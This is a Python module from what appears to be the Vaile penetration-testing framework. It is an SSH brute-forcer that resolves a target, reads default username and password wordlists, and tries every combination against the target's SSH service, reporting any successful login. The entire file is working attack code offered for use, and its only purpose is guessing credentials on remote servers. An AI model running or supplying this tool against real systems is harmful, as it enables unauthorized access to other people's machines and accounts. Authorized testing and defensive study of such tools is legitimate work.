#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    Vaile Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires Vaile Framework
#https://github.com/VainlyStrain/Vaile


import pexpect
import time
import socket
from pexpect import pxssh
from core.Core.colors import *

sshpass = []
sshuser = []

searchinfo = "SSH Bruteforcer"
info = "Crack common SSH credentials using dictionaries."
properties = {}

def sshbrute(web):

    print(R+'\n   ===============================')
    print(R+'    S S H   B R U T E F O R C E R')
    print(R+'   ===============================\n')
    try:
        print(GR+' [*] Testing target...')
        ip = socket.gethostbyname(web)
        m = input(O+' [#] Use IP '+R+str(ip)+O+'? (y/n) :> ')
        if m == 'y' or m == 'Y':
            pass
        elif m == 'n' or m == 'N':
            ip = input(O+' [#] Enter IP :> ')

        print(G+' [+] Target appears online...')
        port = input(GR+' [#] Enter the port (eg. 22) :> ')

        try:
            with open('files/brute-db/ssh/ssh_defuser.lst','r') as users:
                for u in users:
                    u = u.strip('\n')
                    sshuser.append(u)

            with open('files/brute-db/ssh/ssh_defpass.lst','r') as pas:
                for p in pas:
                    p = p.strip('\n')
                    sshpass.append(p)
        except IOError:
            print(R+' [-] Importing wordlist failed!')

        for user in sshuser:
            for password in sshpass:
                try:
                    connect = pxssh.pxssh()
                    connect.login(ip,str(user),password)
                    if True:
                        print(G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password)
                        break
                except:
                    print(C+' [!] Checking '+B+user+C+' and '+B+password+'...')

    except:
        print(R+' [-] Target seems to be down!')
    print(G+" [+] Done!")

def attack(web):
    sshbrute(web)